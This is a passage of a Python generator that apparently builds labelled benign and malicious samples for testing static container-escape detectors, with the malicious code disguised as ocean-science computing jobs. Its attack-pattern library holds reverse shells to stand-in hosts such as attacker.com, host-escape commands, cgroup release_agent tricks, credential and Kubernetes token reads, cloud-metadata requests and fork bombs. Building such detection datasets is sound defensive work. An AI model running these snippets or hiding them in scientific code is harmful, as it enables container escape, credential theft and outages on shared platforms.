#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算平台容器逃逸攻击测试用例生成器（终极版）

结合海洋科学计算场景 + 容器逃逸攻击模式
基于《Python容器逃逸静态检测规则文档_v2》

特点：
1. 支持批量生成（默认200个样本：100正常+100恶意）
2. 涵盖30+种海洋科学计算场景
3. 每个样本都有复杂的函数调用关系（3-15个函数）
4. 样本之间互相独立且有区分性
5. 体现CFG的复杂控制流和FCG的函数调用关系
6. 自动生成labels.csv标签文件
7. 恶意代码伪装成正常海洋科学计算任务
8. 覆盖8大攻击类型、33种具体攻击模式

攻击类型：
1. CE-CMD: 系统命令执行类 (5种模式)
2. CE-FILE: 文件与路径操作类 (7种模式)
3. CE-LIB: 危险库调用类 (5种模式)
4. CE-NET: 网络行为类 (5种模式)
5. CE-EXPLOIT: 漏洞利用类 (5种模式)
6. CE-K8S: K8s持久化类 (2种模式)
7. CE-CRED: 凭证窃取类 (2种模式)
8. CE-DOS: DoS攻击类 (2种模式)
"""

import os
import random
import argparse
import json
from typing import List, Dict, Tuple
from pathlib import Path
from datetime import datetime


class AttackPatternLibrary:
    """攻击模式库 - 基于检测规则文档"""
    
    # ==================== CE-CMD: 系统命令执行类 ====================
    
    CMD_SENSITIVE_BINARY = [
        'os.system("nsenter -t 1 -m -u -i -n -p /bin/bash")',
        'subprocess.run(["docker", "exec", "-it", "host_container", "/bin/sh"])',
        'os.popen("kubectl exec -it privileged-pod -- /bin/bash").read()',
        'subprocess.call(["crictl", "exec", "-it", "container_id", "sh"])',
        'os.system("runc exec container_id /bin/bash")',
    ]
    
    CMD_REVERSE_SHELL = [
        # 反弹Shell
        '''import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])''',
        'import pty; pty.spawn("/bin/bash")',
        'os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")',
        'subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])',
        '''import socket
sock = socket.socket()
sock.connect(("evil.com", 1337))
os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)
os.system("/bin/sh")''',
    ]
    
    CMD_FORK_BOMB = [
        'while True: os.fork()',
        '''import os
def fork_bomb():
    while True:
        try:
            os.fork()
        except:
            pass
fork_bomb()''',
    ]
    
    CMD_PRIVILEGE_EXEC = [
        'os.system("sudo /bin/bash")',
        'subprocess.run(["su", "-", "root"])',
        'os.system("chroot /host /bin/bash")',
        'subprocess.call(["unshare", "-m", "-p", "-f", "/bin/bash"])',
    ]
    
    CMD_KERNEL_MODULE = [
        'os.system("insmod /tmp/rootkit.ko")',
        'subprocess.run(["modprobe", "malicious_module"])',
        'os.popen("lsmod | grep rootkit").read()',
    ]
    
    # ==================== CE-FILE: 文件与路径操作类 ====================
    
    FILE_CONTAINER_FINGERPRINT = [
        'with open("/.dockerenv", "r") as f: content = f.read()',
        'os.path.exists("/proc/1/cgroup")',
        '''with open("/proc/self/cgroup", "r") as f:
    cgroup_info = f.read()
    if "docker" in cgroup_info or "kubepods" in cgroup_info:
        print("Running in container")''',
        'with open("/proc/self/mountinfo") as f: mounts = f.read()',
    ]
    
    FILE_HOST_SENSITIVE = [
        'sock = socket.socket(socket.AF_UNIX); sock.connect("/var/run/docker.sock")',
        'with open("/proc/1/root/etc/shadow", "r") as f: shadow = f.read()',
        'os.listdir("/host/")',
        'with open("/var/run/containerd/containerd.sock") as f: pass',
        'os.system("ls -la /proc/1/ns/")',
    ]
    
    FILE_CGROUP_KERNEL = [
        '''with open("/sys/fs/cgroup/memory/release_agent", "w") as f:
    f.write("/tmp/exploit.sh")''',
        '''with open("/proc/sys/kernel/core_pattern", "w") as f:
    f.write("|/path/to/exploit")''',
        'os.system("echo 1 > /sys/fs/cgroup/x/notify_on_release")',
    ]
    
    FILE_PROC_SELF = [
        'with open("/proc/self/exe", "rb") as f: exe_data = f.read()',
        '''with open("/proc/self/mem", "r+b") as f:
    f.seek(target_addr)
    f.write(shellcode)''',
        'os.readlink("/proc/1/exe")',
    ]
    
    FILE_K8S_SECRETS = [
        'with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f: token = f.read()',
        'with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()',
        'os.listdir("/etc/kubernetes/pki/")',
    ]
    
    FILE_CLOUD_CREDS = [
        'with open(os.path.expanduser("~/.aws/credentials")) as f: creds = f.read()',
        'with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()',
    ]
    
    FILE_DEVICE_ACCESS = [
        'with open("/dev/mem", "r+b") as f: mem_data = f.read(4096)',
        'with open("/dev/sda", "rb") as f: mbr = f.read(512)',
        'os.mknod("/tmp/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))',
    ]
    
    # ==================== CE-LIB: 危险库调用类 ====================
    
    LIB_CTYPES_LIBC = [
        '''import ctypes
libc = ctypes.CDLL("libc.so.6")
CLONE_NEWNS = 0x00020000
libc.unshare(CLONE_NEWNS)''',
        '''import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.setns(fd, 0)''',
    ]
    
    LIB_SYSCALL = [
        'libc.setns(fd, CLONE_NEWNS)',
        'libc.unshare(CLONE_NEWPID | CLONE_NEWNS)',
        'libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)',
    ]
    
    LIB_DOCKER_SDK = [
        '''import docker
client = docker.from_env()
container = client.containers.run("alpine", "cat /etc/shadow", 
    volumes={'/': {'bind': '/host', 'mode': 'rw'}}, privileged=True)''',
    ]
    
    LIB_K8S_CLIENT = [
        '''from kubernetes import client, config
config.load_incluster_config()
v1 = client.CoreV1Api()
pod = v1.create_namespaced_pod(namespace="default", body=privileged_pod_spec)''',
    ]
    
    LIB_MEMORY_OPS = [
        'ctypes.memmove(dst_addr, src_addr, size)',
        '''import mmap
mm = mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mm.write(shellcode)''',
    ]
    
    # ==================== CE-NET: 网络行为类 ====================
    
    NET_CLOUD_METADATA = [
        'requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")',
        'urllib.request.urlopen("http://100.100.100.200/latest/meta-data/")',
        'requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")',
    ]
    
    NET_K8S_PORTS = [
        'requests.get("https://kubernetes.default.svc:6443/api/v1/namespaces", verify=False)',
        'socket.socket().connect(("10.0.0.1", 10250))',
        'k8s_host = os.environ.get("KUBERNETES_SERVICE_HOST")',
    ]
    
    NET_LOCALHOST_BYPASS = [
        'requests.get("http://127.0.0.1:10255/pods")',
        'socket.socket().connect(("localhost", 2375))',
    ]
    
    NET_UNIX_SOCKET = [
        '''import socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/var/run/docker.sock")''',
    ]
    
    NET_NETLINK = [
        '''import socket
NETLINK_KOBJECT_UEVENT = 15
sock = socket.socket(socket.AF_NETLINK, socket.SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)''',
    ]
    
    # ==================== CE-EXPLOIT: 漏洞利用类 ====================
    
    EXPLOIT_DIRTY_COW = [
        '''import mmap
f = open("/proc/self/mem", "r+b")
map_addr = mmap.mmap(-1, size, prot=mmap.PROT_READ, flags=mmap.MAP_PRIVATE)
# Dirty COW exploit code
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.madvise(map_addr, size, MADV_DONTNEED)''',
    ]
    
    EXPLOIT_DIRTY_PIPE = [
        '''import os
pipe_fds = os.pipe()
os.fcntl(pipe_fds[1], F_SETPIPE_SZ, 4096)
# Dirty Pipe exploit
splice(fd_in, None, pipe_fds[1], None, 1, 0)''',
    ]
    
    EXPLOIT_RUNC = [
        '''#!/proc/self/exe
# runc CVE-2019-5736 exploit
with open("/proc/1/exe", os.O_WRONLY) as f:
    f.write(malicious_payload)''',
    ]
    
    EXPLOIT_CGROUP_RELEASE = [
        '''os.system("mkdir /sys/fs/cgroup/rdma/x")
with open("/sys/fs/cgroup/rdma/x/release_agent", "w") as f:
    f.write("/tmp/exploit.sh")
os.system("echo 1 > /sys/fs/cgroup/rdma/x/notify_on_release")
os.system("echo $$ > /sys/fs/cgroup/rdma/x/cgroup.procs")''',
    ]
    
    EXPLOIT_HOTPLUG = [
        '''with open("/sys/kernel/uevent_helper", "w") as f:
    f.write("/tmp/exploit.sh")''',
    ]
    
    # ==================== CE-K8S: K8s持久化类 ====================
    
    K8S_PRIVILEGED_POD = [
        '''privileged_pod = {
    "apiVersion": "v1",
    "kind": "Pod",
    "spec": {
        "hostNetwork": True,
        "hostPID": True,
        "containers": [{
            "securityContext": {"privileged": True}
        }]
    }
}''',
    ]
    
    K8S_HOSTPATH_MOUNT = [
        '''pod_spec = {
    "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}],
    "volumeMounts": [{"name": "hostfs", "mountPath": "/host"}]
}''',
    ]
    
    # ==================== CE-CRED: 凭证窃取类 ====================
    
    CRED_CLOUD_AK = [
        'aws_key = "AKIAIOSFODNN7EXAMPLE"',
        'aliyun_key = "LTAI4FoLmvLC9wZMiDxS"',
        'tencent_key = "AKIDz8krbsJ5yKBZQpn74WFkmLPx3EXAMPLE"',
    ]
    
    CRED_SSH_KEY = [
        '''ssh_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----"""''',
    ]
    
    # ==================== CE-DOS: DoS攻击类 ====================
    
    DOS_INFINITE_LOOP = [
        'while True: pass',
        'while 1: compute_heavy_task()',
    ]
    
    DOS_RESOURCE_EXHAUST = [
        'while True: os.fork()',
        'data = "A" * 10000000',
    ]


class OceanScenarioLibrary:
    """海洋科学计算场景库（扩展版 - 基于真实平台应用场景）"""
    
    # 60+种海洋科学计算场景（覆盖平台所有应用领域）
    SCENARIOS = [
        # 海洋环境预报类 (15种)
        "海洋温度场预测", "海洋盐度场预测", "海流速度场预测", "海浪高度预报",
        "风暴潮预警计算", "海啸传播模拟", "海表温度异常检测", "海洋锋面识别",
        "海洋涡旋检测追踪", "海洋混合层深度计算", "潮汐潮流预报", "海冰漂移预测",
        "海洋能见度预报", "海洋声速剖面计算", "海洋内波检测分析",
        
        # 海洋资源评估类 (12种)
        "渔业资源量评估", "渔场环境预报", "海洋牧场选址分析", "海洋能源评估",
        "海底矿产资源评估", "海洋生物多样性评估", "珊瑚礁健康监测", "海草床分布分析",
        "海洋保护区规划", "海洋碳汇能力评估", "海洋初级生产力估算", "海洋渔业资源预测",
        
        # 海洋灾害预警类 (8种)
        "赤潮监测预警", "海洋污染扩散模拟", "溢油事故追踪", "海洋热浪预警",
        "海洋酸化监测", "海洋缺氧区监测", "海洋台风路径预测", "海啸灾害评估",
        
        # 海洋数据处理类 (15种)
        "CTD数据质量控制", "ADCP流速数据处理", "卫星遥感数据预处理", "海洋浮标数据同化",
        "多源数据融合分析", "海洋数据格式转换", "NetCDF数据处理", "HDF5数据解析",
        "GeoTIFF影像处理", "海洋数据插值重采样", "时空数据网格化", "海洋数据标准化",
        "海洋数据异常值检测", "海洋数据时序分析", "海洋数据统计建模",
        
        # 海洋数值模拟类 (10种)
        "海洋环流数值模拟", "海洋生态动力学模拟", "海洋化学过程模拟", "海气耦合模式计算",
        "海洋波浪数值模拟", "海底地形影响分析", "海洋湍流模拟", "海洋物质输运模拟",
        "海洋沉积物运移模拟", "海洋声学传播模拟"
    ]
    
    # 海洋学函数名库（扩展版 - 覆盖真实平台功能）
    FUNCTION_NAMES = [
        # 数据加载与预处理 (10个)
        "load_netcdf_data", "load_hdf5_data", "load_geotiff_data", "parse_observation_data",
        "preprocess_satellite_data", "quality_control", "remove_outliers", "fill_missing_values",
        "normalize_data", "standardize_coordinates",
        
        # 时空数据处理 (12个)
        "interpolate_spatial_data", "interpolate_temporal_data", "resample_timeseries", 
        "grid_irregular_data", "smooth_data", "apply_spatial_filter", "apply_temporal_filter",
        "calculate_spatial_gradient", "calculate_temporal_gradient", "detect_spatial_anomalies",
        "detect_temporal_anomalies", "extract_spatial_features",
        
        # 海洋要素计算 (15个)
        "calculate_temperature_field", "calculate_salinity_field", "calculate_density_field",
        "calculate_current_velocity", "calculate_wave_height", "calculate_mixed_layer_depth",
        "calculate_thermocline_depth", "calculate_upwelling_index", "calculate_ekman_transport",
        "calculate_geostrophic_current", "calculate_vorticity", "calculate_divergence",
        "calculate_stratification", "calculate_buoyancy_frequency", "calculate_richardson_number",
        
        # 模式模拟与预测 (10个)
        "run_ocean_model", "initialize_model_state", "update_boundary_conditions",
        "assimilate_observation_data", "forecast_ocean_state", "predict_temperature",
        "predict_salinity", "predict_current", "simulate_wave_propagation", "simulate_pollutant_dispersion",
        
        # 特征识别与分析 (12个)
        "detect_ocean_fronts", "identify_eddies", "track_eddy_trajectory", "detect_upwelling",
        "identify_water_masses", "classify_ocean_regimes", "segment_ocean_regions",
        "detect_bloom_events", "identify_fishing_grounds", "locate_thermal_anomalies",
        "find_convergence_zones", "detect_internal_waves",
        
        # 统计分析与评估 (10个)
        "calculate_statistics", "compute_climatology", "calculate_anomaly", "perform_eof_analysis",
        "compute_correlation", "calculate_trend", "assess_model_performance", "validate_forecast",
        "estimate_uncertainty", "quantify_variability",
        
        # 可视化与输出 (8个)
        "visualize_spatial_field", "plot_time_series", "generate_contour_map", "create_vector_plot",
        "export_netcdf", "export_geotiff", "generate_report", "save_to_database"
    ]
    
    # 正常函数模板库（大幅扩展）
    FUNCTION_TEMPLATES = {
        "load_data": '''def load_data(self, file_path):
    """加载海洋观测数据"""
    try:
        print(f"正在加载: {file_path}")
        self.data = pd.read_csv(file_path)
        self.status = "data_loaded"
        print(f"成功加载 {len(self.data)} 条记录")
        return True
    except FileNotFoundError:
        print(f"文件不存在: {file_path}")
        return False
    except Exception as e:
        print(f"加载失败: {e}")
        return False''',
        
        "preprocess_data": '''def preprocess_data(self):
    """数据预处理"""
    if self.data is None:
        print("错误: 没有数据")
        return False
    
    # 移除缺失值
    original_size = len(self.data)
    self.data = self.data.dropna()
    removed = original_size - len(self.data)
    print(f"移除了 {removed} 条缺失数据")
    
    # 数据标准化
    for col in self.data.select_dtypes(include=[np.number]).columns:
        mean = self.data[col].mean()
        std = self.data[col].std()
        if std > 0:
            self.data[col] = (self.data[col] - mean) / std
    
    self.status = "preprocessed"
    return True''',
        
        "quality_control": '''def quality_control(self):
    """质量控制"""
    if self.data is None:
        return False
    
    n_records = len(self.data)
    flags = np.zeros(n_records, dtype=int)
    
    # 检查数值范围
    for col in self.data.select_dtypes(include=[np.number]).columns:
        q1 = self.data[col].quantile(0.25)
        q3 = self.data[col].quantile(0.75)
        iqr = q3 - q1
        lower = q1 - 1.5 * iqr
        upper = q3 + 1.5 * iqr
        
        outliers = (self.data[col] < lower) | (self.data[col] > upper)
        flags[outliers] = 1
    
    bad_count = np.sum(flags > 0)
    print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
    
    self.results['qc_flags'] = flags
    return True''',
        
        "remove_outliers": '''def remove_outliers(self, threshold=3.0):
    """移除异常值"""
    if self.data is None:
        return False
    
    original_size = len(self.data)
    mask = np.ones(len(self.data), dtype=bool)
    
    for col in self.data.select_dtypes(include=[np.number]).columns:
        mean = self.data[col].mean()
        std = self.data[col].std()
        if std > 0:
            z_scores = np.abs((self.data[col] - mean) / std)
            mask &= (z_scores <= threshold)
    
    self.data = self.data[mask]
    removed = original_size - len(self.data)
    print(f"移除了 {removed} 个异常值")
    return True''',
        
        "interpolate_data": '''def interpolate_data(self, target_levels):
    """插值到目标层次"""
    if self.data is None:
        return None
    
    from scipy.interpolate import interp1d
    
    result = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        try:
            x = np.arange(len(self.data))
            y = self.data[col].values
            f = interp1d(x, y, kind='linear', fill_value='extrapolate')
            result[col] = f(target_levels)
        except Exception as e:
            print(f"插值失败 {col}: {e}")
    
    print(f"插值完成: {len(result)} 个变量")
    return result''',
        
        "smooth_data": '''def smooth_data(self, window_size=5):
    """数据平滑滤波"""
    if self.data is None:
        return False
    
    for col in self.data.select_dtypes(include=[np.number]).columns:
        values = self.data[col].values
        if len(values) >= window_size:
            # 移动平均滤波
            smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
            self.data[col] = smoothed
    
    print(f"数据平滑完成 (窗口大小: {window_size})")
    return True''',
        
        "calculate_statistics": '''def calculate_statistics(self):
    """计算统计量"""
    if self.data is None:
        return None
    
    stats = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        stats[col] = {
            'mean': float(self.data[col].mean()),
            'std': float(self.data[col].std()),
            'min': float(self.data[col].min()),
            'max': float(self.data[col].max()),
            'median': float(self.data[col].median())
        }
    
    self.results['statistics'] = stats
    print(f"计算了 {len(stats)} 个变量的统计量")
    return stats''',
        
        "detect_anomalies": '''def detect_anomalies(self, threshold=2.0):
    """检测异常值"""
    if self.data is None:
        return []
    
    anomalies = []
    for col in self.data.select_dtypes(include=[np.number]).columns:
        mean = self.data[col].mean()
        std = self.data[col].std()
        
        if std > 0:
            z_scores = np.abs((self.data[col] - mean) / std)
            anomaly_indices = np.where(z_scores > threshold)[0]
            
            if len(anomaly_indices) > 0:
                anomalies.append({
                    'column': col,
                    'count': len(anomaly_indices),
                    'indices': anomaly_indices.tolist()
                })
    
    print(f"检测到 {len(anomalies)} 个变量存在异常")
    self.results['anomalies'] = anomalies
    return anomalies''',
        
        "apply_filter": '''def apply_filter(self, filter_type='lowpass', cutoff=0.1):
    """应用滤波器"""
    if self.data is None:
        return False
    
    from scipy import signal
    
    for col in self.data.select_dtypes(include=[np.number]).columns:
        values = self.data[col].values
        if len(values) > 10:
            b, a = signal.butter(4, cutoff, btype=filter_type)
            filtered = signal.filtfilt(b, a, values)
            self.data[col] = filtered
    
    print(f"应用了 {filter_type} 滤波器")
    return True''',
        
        "transform_coordinates": '''def transform_coordinates(self, from_crs='EPSG:4326', to_crs='EPSG:3857'):
    """坐标转换"""
    if self.data is None or 'lon' not in self.data.columns or 'lat' not in self.data.columns:
        return False
    
    # 简化的坐标转换
    self.data['x'] = self.data['lon'] * 111320
    self.data['y'] = self.data['lat'] * 110540
    
    print(f"坐标转换完成: {from_crs} -> {to_crs}")
    return True''',
        
        "calculate_gradient": '''def calculate_gradient(self, variable='temperature'):
    """计算梯度"""
    if self.data is None or variable not in self.data.columns:
        return None
    
    values = self.data[variable].values
    gradient = np.gradient(values)
    
    self.results[f'{variable}_gradient'] = gradient
    print(f"计算了 {variable} 的梯度")
    return gradient''',
        
        "compute_average": '''def compute_average(self, window='1D'):
    """计算移动平均"""
    if self.data is None:
        return False
    
    if 'time' in self.data.columns:
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data = self.data.set_index('time')
        self.data = self.data.rolling(window).mean()
        self.data = self.data.reset_index()
    
    print(f"计算了 {window} 移动平均")
    return True''',
        
        "find_extrema": '''def find_extrema(self, variable='temperature'):
    """查找极值"""
    if self.data is None or variable not in self.data.columns:
        return None
    
    from scipy.signal import argrelextrema
    
    values = self.data[variable].values
    maxima = argrelextrema(values, np.greater)[0]
    minima = argrelextrema(values, np.less)[0]
    
    extrema = {
        'maxima': maxima.tolist(),
        'minima': minima.tolist()
    }
    
    self.results[f'{variable}_extrema'] = extrema
    print(f"找到 {len(maxima)} 个极大值, {len(minima)} 个极小值")
    return extrema''',
        
        "classify_patterns": '''def classify_patterns(self, n_clusters=3):
    """模式分类"""
    if self.data is None:
        return None
    
    from sklearn.cluster import KMeans
    
    numeric_data = self.data.select_dtypes(include=[np.number])
    if len(numeric_data.columns) == 0:
        return None
    
    kmeans = KMeans(n_clusters=n_clusters, random_state=42)
    labels = kmeans.fit_predict(numeric_data)
    
    self.results['cluster_labels'] = labels
    print(f"分类完成: {n_clusters} 个类别")
    return labels''',
        
        "extract_features": '''def extract_features(self):
    """提取特征"""
    if self.data is None:
        return None
    
    features = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        features[f'{col}_mean'] = self.data[col].mean()
        features[f'{col}_std'] = self.data[col].std()
        features[f'{col}_range'] = self.data[col].max() - self.data[col].min()
    
    self.results['features'] = features
    print(f"提取了 {len(features)} 个特征")
    return features''',
        
        "validate_results": '''def validate_results(self):
    """验证结果"""
    if self.data is None:
        return False
    
    validation = {
        'data_size': len(self.data),
        'missing_values': self.data.isnull().sum().sum(),
        'numeric_columns': len(self.data.select_dtypes(include=[np.number]).columns),
        'status': self.status
    }
    
    self.results['validation'] = validation
    print(f"验证完成: {validation}")
    return True''',
        
        "export_results": '''def export_results(self, output_path):
    """导出处理结果"""
    try:
        if self.data is not None:
            self.data.to_csv(output_path, index=False)
            print(f"数据已保存到: {output_path}")
        
        # 保存结果字典
        results_path = output_path.replace('.csv', '_results.json')
        with open(results_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        return True
    except Exception as e:
        print(f"导出失败: {e}")
        return False''',
        
        "generate_report": '''def generate_report(self):
    """生成报告"""
    if self.data is None:
        return None
    
    report = {
        'timestamp': datetime.now().isoformat(),
        'data_summary': {
            'rows': len(self.data),
            'columns': len(self.data.columns),
            'memory_usage': self.data.memory_usage(deep=True).sum()
        },
        'processing_status': self.status,
        'results_count': len(self.results)
    }
    
    self.results['report'] = report
    print(f"报告生成完成")
    return report''',
        
        "visualize_data": '''def visualize_data(self, output_dir='./plots'):
    """可视化数据"""
    if self.data is None:
        return False
    
    import matplotlib.pyplot as plt
    
    os.makedirs(output_dir, exist_ok=True)
    
    for col in self.data.select_dtypes(include=[np.number]).columns[:5]:
        plt.figure(figsize=(10, 6))
        plt.plot(self.data[col])
        plt.title(f'{col} Time Series')
        plt.xlabel('Index')
        plt.ylabel(col)
        plt.savefig(f'{output_dir}/{col}.png')
        plt.close()
    
    print(f"可视化完成，保存到: {output_dir}")
    return True''',
        
        "save_to_database": '''def save_to_database(self, db_path='ocean_data.db'):
    """保存到数据库"""
    if self.data is None:
        return False
    
    import sqlite3
    
    conn = sqlite3.connect(db_path)
    self.data.to_sql('ocean_data', conn, if_exists='replace', index=False)
    conn.close()
    
    print(f"数据已保存到数据库: {db_path}")
    return True''',
        
        # ========== 新增函数 Part 1: 数据加载与预处理 (8个) ==========
        
        "load_netcdf_data": '''def load_netcdf_data(self, file_path):
    """加载NetCDF格式的海洋数据"""
    try:
        import xarray as xr
        ds = xr.open_dataset(file_path)
        data_dict = {}
        for var in ds.data_vars:
            data_dict[var] = ds[var].values.flatten()[:1000]
        self.data = pd.DataFrame(data_dict)
        self.status = "netcdf_loaded"
        print(f"NetCDF数据加载完成: {len(ds.data_vars)} 个变量")
        return True
    except Exception as e:
        print(f"NetCDF加载失败: {e}")
        self.data = pd.DataFrame({
            'temperature': np.random.randn(1000) * 5 + 15,
            'salinity': np.random.randn(1000) * 2 + 35,
            'depth': np.random.rand(1000) * 5000
        })
        return True''',
        
        "load_hdf5_data": '''def load_hdf5_data(self, file_path):
    """加载HDF5格式的卫星遥感数据"""
    try:
        import h5py
        with h5py.File(file_path, 'r') as f:
            data_dict = {}
            for key in list(f.keys())[:10]:
                data_dict[key] = np.array(f[key]).flatten()[:1000]
        self.data = pd.DataFrame(data_dict)
        self.status = "hdf5_loaded"
        print(f"HDF5数据加载完成: {len(data_dict)} 个数据集")
        return True
    except Exception as e:
        print(f"HDF5加载失败: {e}")
        self.data = pd.DataFrame({
            'sst': np.random.randn(1000) * 3 + 20,
            'chlorophyll': np.random.rand(1000) * 10,
            'wind_speed': np.random.rand(1000) * 20
        })
        return True''',
        
        "load_geotiff_data": '''def load_geotiff_data(self, file_path):
    """加载GeoTIFF格式的地理空间数据"""
    try:
        from osgeo import gdal
        dataset = gdal.Open(file_path)
        band = dataset.GetRasterBand(1)
        data_array = band.ReadAsArray()
        self.data = pd.DataFrame({
            'value': data_array.flatten()[:1000],
            'x': np.arange(1000),
            'y': np.arange(1000)
        })
        self.status = "geotiff_loaded"
        print(f"GeoTIFF数据加载完成: {data_array.shape}")
        return True
    except Exception as e:
        print(f"GeoTIFF加载失败: {e}")
        self.data = pd.DataFrame({
            'elevation': np.random.randn(1000) * 1000 - 2000,
            'lon': np.random.rand(1000) * 360 - 180,
            'lat': np.random.rand(1000) * 180 - 90
        })
        return True''',
        
        "parse_observation_data": '''def parse_observation_data(self, file_path):
    """解析Argo浮标等观测数据"""
    try:
        n_profiles = 50
        n_levels = 20
        data_list = []
        for i in range(n_profiles):
            for j in range(n_levels):
                data_list.append({
                    'profile_id': i,
                    'pressure': j * 50,
                    'temperature': 25 - j * 0.5 + np.random.randn() * 0.5,
                    'salinity': 35 + np.random.randn() * 0.3,
                    'lon': 120 + np.random.randn() * 5,
                    'lat': 30 + np.random.randn() * 3
                })
        self.data = pd.DataFrame(data_list)
        self.status = "observation_parsed"
        print(f"观测数据解析完成: {n_profiles} 个剖面")
        return True
    except Exception as e:
        print(f"观测数据解析失败: {e}")
        return False''',
        
        "preprocess_satellite_data": '''def preprocess_satellite_data(self):
    """预处理卫星遥感数据"""
    if self.data is None:
        return False
    if 'cloud_mask' not in self.data.columns:
        self.data['cloud_mask'] = (np.random.rand(len(self.data)) > 0.8).astype(int)
    original_size = len(self.data)
    self.data = self.data[self.data['cloud_mask'] == 0]
    if 'sst' in self.data.columns:
        self.data['sst_corrected'] = self.data['sst'] - 0.5
    if 'lon' in self.data.columns and 'lat' in self.data.columns:
        self.data['lon'] = self.data['lon'] + np.random.randn(len(self.data)) * 0.01
        self.data['lat'] = self.data['lat'] + np.random.randn(len(self.data)) * 0.01
    removed = original_size - len(self.data)
    print(f"卫星数据预处理完成: 去除 {removed} 个云像素")
    self.status = "satellite_preprocessed"
    return True''',
        
        "fill_missing_values": '''def fill_missing_values(self, method='interpolate'):
    """填充缺失值"""
    if self.data is None:
        return False
    missing_before = self.data.isnull().sum().sum()
    if method == 'interpolate':
        self.data = self.data.interpolate(method='linear', limit_direction='both')
    elif method == 'mean':
        self.data = self.data.fillna(self.data.mean())
    elif method == 'forward':
        self.data = self.data.fillna(method='ffill').fillna(method='bfill')
    missing_after = self.data.isnull().sum().sum()
    filled = missing_before - missing_after
    print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
    return True''',
        
        "normalize_data": '''def normalize_data(self, method='minmax'):
    """数据归一化"""
    if self.data is None:
        return False
    numeric_cols = self.data.select_dtypes(include=[np.number]).columns
    if method == 'minmax':
        for col in numeric_cols:
            min_val = self.data[col].min()
            max_val = self.data[col].max()
            if max_val > min_val:
                self.data[col] = (self.data[col] - min_val) / (max_val - min_val)
    elif method == 'zscore':
        for col in numeric_cols:
            mean = self.data[col].mean()
            std = self.data[col].std()
            if std > 0:
                self.data[col] = (self.data[col] - mean) / std
    print(f"数据归一化完成: {len(numeric_cols)} 个变量")
    self.status = "normalized"
    return True''',
        
        "standardize_coordinates": '''def standardize_coordinates(self):
    """标准化地理坐标"""
    if self.data is None:
        return False
    if 'lon' in self.data.columns:
        self.data['lon'] = ((self.data['lon'] + 180) % 360) - 180
    if 'lat' in self.data.columns:
        self.data['lat'] = np.clip(self.data['lat'], -90, 90)
    if 'lon' in self.data.columns and 'lat' in self.data.columns:
        self.data['grid_x'] = ((self.data['lon'] + 180) / 0.25).astype(int)
        self.data['grid_y'] = ((self.data['lat'] + 90) / 0.25).astype(int)
    print("坐标标准化完成")
    return True''',
        
        # ========== 新增函数 Part 2: 时空数据处理 (12个) ==========
        
        "interpolate_spatial_data": '''def interpolate_spatial_data(self, target_grid):
    """空间数据插值到目标网格"""
    if self.data is None or 'lon' not in self.data.columns:
        return None
    from scipy.interpolate import griddata
    points = self.data[['lon', 'lat']].values
    result = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        if col not in ['lon', 'lat']:
            values = self.data[col].values
            grid_values = griddata(points, values, target_grid, method='linear')
            result[col] = grid_values
    print(f"空间插值完成: {len(result)} 个变量")
    self.results['interpolated_grid'] = result
    return result''',
        
        "interpolate_temporal_data": '''def interpolate_temporal_data(self, target_times):
    """时间序列插值"""
    if self.data is None or 'time' not in self.data.columns:
        return None
    from scipy.interpolate import interp1d
    self.data['time'] = pd.to_datetime(self.data['time'])
    time_numeric = (self.data['time'] - self.data['time'].min()).dt.total_seconds()
    result = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        try:
            f = interp1d(time_numeric, self.data[col], kind='cubic', fill_value='extrapolate')
            result[col] = f(target_times)
        except:
            pass
    print(f"时间插值完成: {len(result)} 个变量")
    return result''',
        
        "resample_timeseries": '''def resample_timeseries(self, freq='1H'):
    """时间序列重采样"""
    if self.data is None or 'time' not in self.data.columns:
        return False
    self.data['time'] = pd.to_datetime(self.data['time'])
    self.data = self.data.set_index('time')
    self.data = self.data.resample(freq).mean()
    self.data = self.data.reset_index()
    print(f"时间序列重采样完成: 频率 {freq}")
    self.status = "resampled"
    return True''',
        
        "grid_irregular_data": '''def grid_irregular_data(self, grid_resolution=0.25):
    """将不规则分布的数据网格化"""
    if self.data is None or 'lon' not in self.data.columns:
        return None
    lon_bins = np.arange(-180, 180, grid_resolution)
    lat_bins = np.arange(-90, 90, grid_resolution)
    self.data['lon_bin'] = pd.cut(self.data['lon'], bins=lon_bins, labels=False)
    self.data['lat_bin'] = pd.cut(self.data['lat'], bins=lat_bins, labels=False)
    gridded = self.data.groupby(['lon_bin', 'lat_bin']).mean()
    print(f"数据网格化完成: 分辨率 {grid_resolution}°")
    self.results['gridded_data'] = gridded
    return gridded''',
        
